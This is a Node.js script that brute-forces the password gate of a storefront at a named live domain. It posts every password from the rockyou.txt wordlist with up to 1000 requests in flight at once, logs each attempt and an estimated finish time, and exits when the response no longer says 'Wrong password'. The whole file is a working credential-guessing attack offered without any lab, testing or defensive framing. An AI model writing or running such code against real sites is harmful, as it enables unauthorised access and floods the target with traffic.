const fs = require("fs");
const fetch = require("node-fetch"); // Use node-fetch in Node.js if necessary

const rockyou = fs
  .readFileSync("../../../static/rockyou.txt", "utf8")
  .split("\n");
const CONCURRENCY_LIMIT = 1000;
let activeRequests = 0;
let completedRequests = 0;
const startTime = Date.now();

async function tryPassword(password) {
  const formData = new FormData();
  formData.append("password", password);
  formData.append("utf8", "Submit");
  formData.append("form_type", "storefront_password");
  formData.append("utf8", "✓");
  formData.append("password", password);

  try {
    const res = await fetch("https://akimata.com/password", {
      method: "POST",
      headers: {},
      body: formData,
    });
    const isPasswordWrong = (await res.text()).includes("Wrong password");
    completedRequests++;

    // Calculate and print estimated end time
    const elapsedTime = Date.now() - startTime;
    const avgTimePerRequest = elapsedTime / completedRequests;
    const remainingRequests = rockyou.length - completedRequests;
    const remainingTime = avgTimePerRequest * remainingRequests;
    const estimatedEndTime = new Date(Date.now() + remainingTime);

    console.log(
      `[${rockyou.findIndex((e) => e == password)}] Status: ${res.status}, Password: ${password}, Wrong: ${isPasswordWrong}`,
    );
    console.log(`Estimated End Time: ${estimatedEndTime.toLocaleTimeString()}`);

    if (!isPasswordWrong) {
      console.log("Password found:", password);
      process.exit(0); // Stop all requests if the password is found
    }
  } catch (error) {
    console.error("Error with password", password, error);
  }
}

async function run() {
  for (const password of rockyou) {
    while (activeRequests >= CONCURRENCY_LIMIT) {
      await new Promise((resolve) => setTimeout(resolve, 50));
    }
    activeRequests++;
    tryPassword(password).finally(() => activeRequests--);
  }
}

run().then(() => console.log("Finished trying all passwords."));
